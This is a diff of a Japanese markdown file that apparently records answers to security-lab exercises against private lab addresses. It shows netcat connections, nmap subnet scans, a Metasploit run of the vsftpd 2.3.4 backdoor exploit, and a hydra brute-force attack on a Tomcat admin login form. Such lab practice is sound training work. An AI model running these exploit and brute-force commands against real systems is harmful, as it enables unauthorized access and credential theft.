@@ -5,13 +5,13 @@
 ### サーバー側コマンド
 
 ```sh
-# nc -lvp 5200
+ nc -lvp 5200
 
 ```
 ### クライアント側コマンド
 
 ```sh
-# nc 192.168.33.10 5200
+ nc 192.168.33.10 5200
 
 ```
 
@@ -27,27 +27,27 @@
 ### 1. ping scan
 
 ```sh
-# nmap -sP 192.168.33.0/24
+ nmap -sP 192.168.33.0/24
 
 ```
 
 ### 2. version scan
 
 ```sh
-# nmap 192.168.33.1/24
+ nmap 192.168.33.1/24
 
 ```
 
 ## 問4 [Metasploit Framework]
 
 ```sh
-# msfconsole
-# search vsftp
-# use vsftpd_234_backdoor
-# show options
-# set RHOSTS 192.168.33.5
-# show optionsで変わったか確認
-# exploit
+ msfconsole
+ search vsftp
+ use vsftpd_234_backdoor
+ show options
+ set RHOSTS 192.168.33.5
+ show optionsで変わったか確認
+ exploit
 
 ```
 
@@ -57,7 +57,7 @@
 ### 1. コマンド
 
 ```sh
-# hydra -L user.list -P passwd.list -s 8180 192.168.33.5 http-form-post "/admin/j_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"
+ hydra -L user.list -P passwd.list -s 8180 192.168.33.5 http-form-post "/admin/j_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"
 ```
 
 ### 2. 解析結果
